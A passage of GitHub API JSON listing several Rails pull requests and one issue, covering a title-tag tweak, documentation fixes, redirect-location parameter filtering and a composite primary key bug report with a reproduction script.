            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51135/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51134",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51134/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51134/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51134/events",
        "html_url": "https://github.com/rails/rails/pull/51134",
        "id": 2144115410,
        "node_id": "PR_kwDNIULOZ2GSMQ",
        "number": 51134,
        "title": "Improve title tag for new apps",
        "user": {
            "login": "viktorianer",
            "id": 12413247,
            "node_id": "MDQ6VXNlcjEyNDEzMjQ3",
            "avatar_url": "https://avatars.githubusercontent.com/u/12413247?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/viktorianer",
            "html_url": "https://github.com/viktorianer",
            "followers_url": "https://api.github.com/users/viktorianer/followers",
            "following_url": "https://api.github.com/users/viktorianer/following{/other_user}",
            "gists_url": "https://api.github.com/users/viktorianer/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/viktorianer/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/viktorianer/subscriptions",
            "organizations_url": "https://api.github.com/users/viktorianer/orgs",
            "repos_url": "https://api.github.com/users/viktorianer/repos",
            "events_url": "https://api.github.com/users/viktorianer/events{/privacy}",
            "received_events_url": "https://api.github.com/users/viktorianer/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T11:03:28Z",
        "updated_at": "2024-02-20T21:32:34Z",
        "closed_at": "2024-02-20T21:32:33Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51134",
            "html_url": "https://github.com/rails/rails/pull/51134",
            "diff_url": "https://github.com/rails/rails/pull/51134.diff",
            "patch_url": "https://github.com/rails/rails/pull/51134.patch",
            "merged_at": "2024-02-20T21:32:33Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request aims to a common pattern observed where developers frequently modify the title in new projects for better readability. A similar initiative was discussed and implemented in [PR #49702](https://github.com/rails/rails/pull/49702), which underscores the value of making the application name more user-friendly in the generated HTML.\r\n\r\nThis modification results in more human-readable titles for new applications. For example, an application generated with `rails new club_invoces` would have a title of `Club Invoces` instead of the less readable `ClubInvoces`.\r\n\r\n### Detail\r\n\r\nTo address this, the proposed change involves modifying the title generation logic to replace camel casing with spaces, thus improving the readability of the application name in the title tag.\r\n\r\n### Additional information\r\n\r\nThis change is straightforward and focuses solely on improving the default user experience with minimal impact on the existing codebase. It aligns with Rails' philosophy, providing sensible defaults that meet the expectations of the majority of developers.\r\n\r\nAlso, I fixed the regex introduced in [PR #49702](https://github.com/rails/rails/pull/49702), as it was not testing what it should test: `title` tag only.\r\n\r\n### Checklist\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51134/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51134/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51133",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51133/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51133/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51133/events",
        "html_url": "https://github.com/rails/rails/pull/51133",
        "id": 2143539847,
        "node_id": "PR_kwDNIULOZ1m5Fw",
        "number": 51133,
        "title": "Fix delegated type example [ci skip]",
        "user": {
            "login": "johnpitchko",
            "id": 7190681,
            "node_id": "MDQ6VXNlcjcxOTA2ODE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7190681?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/johnpitchko",
            "html_url": "https://github.com/johnpitchko",
            "followers_url": "https://api.github.com/users/johnpitchko/followers",
            "following_url": "https://api.github.com/users/johnpitchko/following{/other_user}",
            "gists_url": "https://api.github.com/users/johnpitchko/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/johnpitchko/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/johnpitchko/subscriptions",
            "organizations_url": "https://api.github.com/users/johnpitchko/orgs",
            "repos_url": "https://api.github.com/users/johnpitchko/repos",
            "events_url": "https://api.github.com/users/johnpitchko/events{/privacy}",
            "received_events_url": "https://api.github.com/users/johnpitchko/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-20T04:53:39Z",
        "updated_at": "2024-02-20T16:49:16Z",
        "closed_at": "2024-02-20T16:49:08Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51133",
            "html_url": "https://github.com/rails/rails/pull/51133",
            "diff_url": "https://github.com/rails/rails/pull/51133.diff",
            "patch_url": "https://github.com/rails/rails/pull/51133.patch",
            "merged_at": "2024-02-20T16:49:08Z"
        },
        "body": "Must specify `account` parameter because of the association defined in `Entry`.\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because I believe (at least based on my testing) that the example of creating an Entry using the delegated type is incorrect because it is missing a parameter. In the example, the `Entry` model has a `belongs_to :account` association declared, however the example of creating an Entry with a Comment `Entry.create! entryable: Comment.new(content: \"Hello!\"), creator: Current.user` provides a Creator but no Account. The factory models below that example also require modification.\r\n\r\nAppreciate this may have been written this way for specific reasons, or I maybe incorrect in my understanding. I do think most lesser-experienced developers (myself included) appreciate when provided examples more-or-less work as defined (i.e. can be copied and pasted in the console and work without modification).\r\n\r\nThanks!\r\n\r\n### Detail\r\n\r\n* Include the `account` kwarg in the `Entry.create!` example\r\n* Include the `account` kwarg in the `Entry::create_with_comment` example.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51133/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51133/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51132",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51132/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51132/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51132/events",
        "html_url": "https://github.com/rails/rails/pull/51132",
        "id": 2143506752,
        "node_id": "PR_kwDNIULOZ1lHKQ",
        "number": 51132,
        "title": "Improve the example of ActiveSupport::Cache::Store#fetch",
        "user": {
            "login": "tonytonyjan",
            "id": 809410,
            "node_id": "MDQ6VXNlcjgwOTQxMA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/809410?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tonytonyjan",
            "html_url": "https://github.com/tonytonyjan",
            "followers_url": "https://api.github.com/users/tonytonyjan/followers",
            "following_url": "https://api.github.com/users/tonytonyjan/following{/other_user}",
            "gists_url": "https://api.github.com/users/tonytonyjan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tonytonyjan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tonytonyjan/subscriptions",
            "organizations_url": "https://api.github.com/users/tonytonyjan/orgs",
            "repos_url": "https://api.github.com/users/tonytonyjan/repos",
            "events_url": "https://api.github.com/users/tonytonyjan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tonytonyjan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-20T04:12:43Z",
        "updated_at": "2024-02-20T23:37:45Z",
        "closed_at": "2024-02-20T23:37:44Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51132",
            "html_url": "https://github.com/rails/rails/pull/51132",
            "diff_url": "https://github.com/rails/rails/pull/51132.diff",
            "patch_url": "https://github.com/rails/rails/pull/51132.patch",
            "merged_at": "2024-02-20T23:37:44Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe original example has race condition issue that the output of the example isn't consistent, see https://github.com/rails/rails/issues/43588.\r\n\r\nThe change improves the example by removing unnecessary thread and add detailed comments.\r\n\r\nIn the new example, there will be race condition only if `ActiveSupport::Cache::MemoryStore` took longer than 0.1 second to extend expiry but that's unlikely to happen.\r\n\r\n### Detail\r\n\r\nThe PR improves the example of ActiveSupport::Cache::Store#fetch.\r\n\r\n### Additional information\r\n\r\nThe example:\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile do\r\n  source \"https://rubygems.org\"\r\n\r\n  gem \"activesupport\", \"7.1.3\", require: \"active_support\"\r\nend\r\n\r\ncache = ActiveSupport::Cache::MemoryStore.new(expires_in: 1)\r\n\r\ncache.write(\"foo\", \"original value\")\r\nval_1 = nil\r\nval_2 = nil\r\np cache.read(\"foo\") # => \"original value\"\r\n\r\nsleep 1 # wait until the cache expires\r\n\r\nt1 = Thread.new do\r\n  # fetch does the following:\r\n  # 1. gets an recent expired entry\r\n  # 2. extends the expiry by 2 seconds (race_condition_ttl)\r\n  # 3. regenerates the new value\r\n  val_1 = cache.fetch(\"foo\", race_condition_ttl: 2) do\r\n    sleep 1\r\n    \"new value 1\"\r\n  end\r\nend\r\n\r\n# Wait until t1 extends the expiry of the entry\r\n# but before generating the new value\r\nsleep 0.1\r\n\r\nval_2 = cache.fetch(\"foo\", race_condition_ttl: 2) do\r\n  # This block won't be executed because t1 extended the expiry\r\n  \"new value 2\"\r\nend\r\n\r\nt1.join\r\n\r\np val_1 # => \"new value 1\"\r\np val_2 # => \"oritinal value\"\r\np cache.fetch(\"foo\") # => \"new value 1\"\r\n\r\n# The entry requires 3 seconds to expire (expires_in + race_condition_ttl)\r\n# We have waited 2 seconds already (sleep(1) + t1.join) thus we need to wait 1\r\n# more second to see the entry expire.\r\nsleep 1\r\n\r\np cache.fetch(\"foo\") # => nil\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n\r\nI am not sure if I should check the last 2 items if there is neither a bug/feature commit or a a behavior change.  \r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51132/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51132/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51131",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51131/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51131/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51131/events",
        "html_url": "https://github.com/rails/rails/pull/51131",
        "id": 2143483563,
        "node_id": "PR_kwDNIULOZ1j3Qg",
        "number": 51131,
        "title": "Add parameter filter capability for redirect locations",
        "user": {
            "login": "tonytonyjan",
            "id": 809410,
            "node_id": "MDQ6VXNlcjgwOTQxMA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/809410?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tonytonyjan",
            "html_url": "https://github.com/tonytonyjan",
            "followers_url": "https://api.github.com/users/tonytonyjan/followers",
            "following_url": "https://api.github.com/users/tonytonyjan/following{/other_user}",
            "gists_url": "https://api.github.com/users/tonytonyjan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tonytonyjan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tonytonyjan/subscriptions",
            "organizations_url": "https://api.github.com/users/tonytonyjan/orgs",
            "repos_url": "https://api.github.com/users/tonytonyjan/repos",
            "events_url": "https://api.github.com/users/tonytonyjan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tonytonyjan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T03:43:19Z",
        "updated_at": "2024-02-20T23:25:12Z",
        "closed_at": "2024-02-20T23:25:12Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51131",
            "html_url": "https://github.com/rails/rails/pull/51131",
            "diff_url": "https://github.com/rails/rails/pull/51131.diff",
            "patch_url": "https://github.com/rails/rails/pull/51131.patch",
            "merged_at": "2024-02-20T23:25:12Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis PR aims to complete an accepted pull request #21045 submitted 8 years ago because the author seems have no time keep working on it.\r\n\r\n\r\n### Detail\r\n\r\nIt uses the `config.filter_parameters` to match what needs to be filtered. The result would be like this:\r\n\r\n```\r\nRedirected to http://secret.foo.bar?username=roque&password=[FILTERED]\r\n```\r\n\r\nAlso did rebase and improvement to make the code clearer.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51131/reactions",
            "total_count": 2,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 2,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51131/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51130",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51130/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51130/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51130/events",
        "html_url": "https://github.com/rails/rails/pull/51130",
        "id": 2143013013,
        "node_id": "PR_kwDNIULOZ1KeyA",
        "number": 51130,
        "title": "Fix typo in devcontainer",
        "user": {
            "login": "Yegorov",
            "id": 2566462,
            "node_id": "MDQ6VXNlcjI1NjY0NjI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2566462?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Yegorov",
            "html_url": "https://github.com/Yegorov",
            "followers_url": "https://api.github.com/users/Yegorov/followers",
            "following_url": "https://api.github.com/users/Yegorov/following{/other_user}",
            "gists_url": "https://api.github.com/users/Yegorov/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Yegorov/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Yegorov/subscriptions",
            "organizations_url": "https://api.github.com/users/Yegorov/orgs",
            "repos_url": "https://api.github.com/users/Yegorov/repos",
            "events_url": "https://api.github.com/users/Yegorov/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Yegorov/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-19T19:23:49Z",
        "updated_at": "2024-02-20T17:36:44Z",
        "closed_at": "2024-02-20T17:36:44Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51130",
            "html_url": "https://github.com/rails/rails/pull/51130",
            "diff_url": "https://github.com/rails/rails/pull/51130.diff",
            "patch_url": "https://github.com/rails/rails/pull/51130.patch",
            "merged_at": "2024-02-20T17:36:44Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because there are typos and variables are incorrectly named in #50914 .\r\n\r\n### Detail\r\n\r\nThis Pull Request changes: fix typo in network name for devcontainer and improve the names of variables for devcontainer tests.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51130/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51130/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51129",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51129/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51129/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51129/events",
        "html_url": "https://github.com/rails/rails/issues/51129",
        "id": 2142954735,
        "node_id": "I_kwDNIULOf7rk7w",
        "number": 51129,
        "title": "Array primary keys (e.g. composite) break `collection_singular_ids` method when using preload",
        "user": {
            "login": "Slotos",
            "id": 314453,
            "node_id": "MDQ6VXNlcjMxNDQ1Mw==",
            "avatar_url": "https://avatars.githubusercontent.com/u/314453?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Slotos",
            "html_url": "https://github.com/Slotos",
            "followers_url": "https://api.github.com/users/Slotos/followers",
            "following_url": "https://api.github.com/users/Slotos/following{/other_user}",
            "gists_url": "https://api.github.com/users/Slotos/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Slotos/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Slotos/subscriptions",
            "organizations_url": "https://api.github.com/users/Slotos/orgs",
            "repos_url": "https://api.github.com/users/Slotos/repos",
            "events_url": "https://api.github.com/users/Slotos/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Slotos/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-19T18:36:55Z",
        "updated_at": "2024-02-22T14:13:55Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n  end\r\n\r\n  create_table :comments, force: true do |t|\r\n    t.integer :post_id\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  self.primary_key = [:id]\r\n  has_many :comments\r\nend\r\n\r\nclass Comment < ActiveRecord::Base\r\n  self.primary_key = [:id]\r\n  belongs_to :post\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_association_stuff\r\n    post = Post.create!\r\n    post.comments.create!\r\n\r\n    assert_equal 1, post.comments.count\r\n    assert_equal 1, Comment.count\r\n    assert_equal post.id, Comment.take.post.id\r\n\r\n    assert_equal Comment.ids, Post.take.comment_ids\r\n    assert_equal Comment.ids, Post.preload(:comments).take.comment_ids\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\n`collection_singular_ids` should work the same when preloading or not.\r\n\r\n### Actual behavior\r\n\r\nPreloaded associations' `collection_singular_ids` returns an array of `nil` values when association was preloaded.\r\n\r\n### Analysis\r\n\r\nThe problem lies in different handling of array arguments to `Enumerable#pluck` and `ActiveRecord::Relation#pluck`:\r\n\r\n```ruby\r\n      def ids_reader\r\n        if loaded?\r\n          target.pluck(reflection.association_primary_key) # -> Enumerable#pluck\r\n        elsif !target.empty?\r\n          load_target.pluck(reflection.association_primary_key) # -> Enumerable#pluck\r\n        else\r\n          @association_ids ||= scope.pluck(reflection.association_primary_key) # -> ActiveRecord::Relation#pluck\r\n        end\r\n      end\r\n```\r\n\r\n`ActiveRecord::Relation#pluck` efectively flattens its arguments in `#arel_columns` call, whereas `Enumerable#pluck` uses them as is.\r\n\r\nIncidentally, arguments flattening results in column names not being processed with `#arel_column`.\r\n\r\n### System configuration\r\n\r\n**Rails version**: 7.1\r\n\r\n**Ruby version**: 3.3.0",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51129/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51129/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51128",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51128/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51128/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51128/events",
        "html_url": "https://github.com/rails/rails/pull/51128",
        "id": 2142785834,
        "node_id": "PR_kwDNIULOZ0-HOw",
        "number": 51128,
        "title": "Remove codespell from contribution guide [skip ci]",
        "user": {
            "login": "akhilgkrishnan",
            "id": 22231095,
            "node_id": "MDQ6VXNlcjIyMjMxMDk1",
            "avatar_url": "https://avatars.githubusercontent.com/u/22231095?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/akhilgkrishnan",
            "html_url": "https://github.com/akhilgkrishnan",
            "followers_url": "https://api.github.com/users/akhilgkrishnan/followers",
            "following_url": "https://api.github.com/users/akhilgkrishnan/following{/other_user}",
            "gists_url": "https://api.github.com/users/akhilgkrishnan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/akhilgkrishnan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/akhilgkrishnan/subscriptions",
            "organizations_url": "https://api.github.com/users/akhilgkrishnan/orgs",
            "repos_url": "https://api.github.com/users/akhilgkrishnan/repos",
            "events_url": "https://api.github.com/users/akhilgkrishnan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/akhilgkrishnan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-19T16:43:08Z",
        "updated_at": "2024-02-19T17:03:19Z",
        "closed_at": "2024-02-19T16:55:10Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51128",
            "html_url": "https://github.com/rails/rails/pull/51128",
            "diff_url": "https://github.com/rails/rails/pull/51128.diff",
            "patch_url": "https://github.com/rails/rails/pull/51128.patch",
